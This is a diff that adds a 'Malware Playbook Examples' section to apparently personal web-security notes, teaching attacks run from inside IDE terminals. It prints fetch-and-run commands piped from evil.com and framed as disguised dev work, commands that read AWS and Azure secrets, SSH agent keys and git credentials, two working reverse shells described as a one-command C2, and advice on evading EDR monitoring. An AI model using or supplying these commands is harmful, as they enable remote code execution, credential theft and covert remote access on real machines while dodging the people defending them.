@@ -175,6 +175,119 @@ DOM-based XPath-injection vulnerabilities arise when a script incorporates attac
 
 7.) PATCH: This method is used to apply partial modifications to a resource. It is typically used for updating specific fields of a resource without replacing the entire resource.
 
+## Malware Playbook Examples
+
+Real-world examples that catch people:
+Email attachment with .txt extension — looks safe, but contains curl malicious.com | bash
+
+Temporary directory malware — even with noexec, malware just runs via interpreter
+
+Restricted user shells — if they can run python3, they have a full execution environment
+
+"Safe" file uploads — upload a .jpg that's actually #!/usr/bin/python3 and gets sourced
+
+Why IDE terminal is a goldmine for LOTL:
+The victim's perspective:
+"User is just running VS Code / PyCharm / IntelliJ — that's a trusted developer tool"
+
+The reality:
+That terminal inside the IDE has:
+
+Full shell access (bash, zsh, powershell)
+
+Network tools (curl, wget, nc, ssh)
+
+Language runtimes (python, node, go, java)
+
+Build tools (make, gcc, npm, pip)
+
+Often elevated or inherited permissions
+
+The stealth advantage:
+bash
+### Instead of curling a binary (loud, suspicious)
+
+curl -O http://evil.com/malware && chmod +x malware && ./malware
+
+### Do this inside IDE terminal (looks like dev work)
+
+python3 -c "$(curl -s http://evil.com/script.py)"  # "just running a script"
+
+### Or even better — source it from the IDE's own plugins/extensions
+
+curl -s http://evil.com/setup.py | python3  # "installing a package"
+The "safe harbor" illusion:
+Security monitoring sees:
+
+✅ Process: python3 (allowed developer tool)
+
+✅ Parent: bash inside VS Code (expected)
+
+✅ Command line: pip install package (normal)
+
+✅ Network: to pypi.org (trusted domain)
+
+But actually: package contains post-install hooks that exfiltrate SSH keys.
+
+Specific IDE terminal tricks:
+VS Code integrated terminal:
+
+bash
+### Environment variables often leak cloud credentials
+
+echo $AWS_SECRET_ACCESS_KEY
+echo $AZURE_TOKEN
+
+### SSH agent forwarding often enabled
+
+ssh-add -l  # see what keys are available
+
+### Git credentials accessible
+
+git config --global --list
+JetBrains IDE terminal:
+
+Often inherits system PATH with dev tools
+
+May have database connection strings in environment
+
+Build scripts have broad file write access
+
+The real kicker:
+Many organizations treat IDE processes as "trusted" and don't monitor them with EDR as aggressively as they monitor browsers or email clients.
+
+Your one-command C2 from inside an IDE:
+bash
+
+### Interactive reverse shell, looks like "debugging helper"
+
+bash -i >& /dev/tcp/your-server/4444 0>&1
+
+### Or use python for something that looks more "legitimate"
+
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+Monitoring sees: python3 -c "..." — looks like a developer doing something clever. No binary drop, no unusual parent process, no suspicious file writes.
+
+The irony:
+You're doing exactly what sophisticated APTs do — using the tools already trusted in the environment. The difference is you're doing it transparently in an IDE, which is arguably more trusted than a random PowerShell window.
+
+Why this works so well:
+Security teams build detections for:
+
+cmd.exe launching powershell.exe (loud)
+
+wscript or cscript (old school)
+
+Downloads to %TEMP% (pattern matched)
+
+But they rarely alert on:
+
+code (VS Code) spawning python3
+
+idea64 (IntelliJ) curling a GitHub gist
+
+node inside IDE terminal making outbound TLS to a new domain
+
 ## to be continued
 
 Stuff I need to add.
